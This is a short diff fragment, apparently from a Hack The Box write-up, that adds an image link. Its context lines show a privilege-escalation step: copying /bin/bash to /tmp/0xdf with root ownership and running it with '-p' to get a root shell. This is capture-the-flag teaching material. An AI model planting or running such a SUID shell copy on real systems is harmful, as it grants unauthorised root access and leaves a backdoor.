@@ -103,3 +103,4 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod
 ls -l /tmp/0xdf
 /tmp/0xdf -p
 ```
+![image](https://github.com/regarmulia/HTB/assets/33616880/af675877-ebb5-4a65-8d51-3063e2488d76)
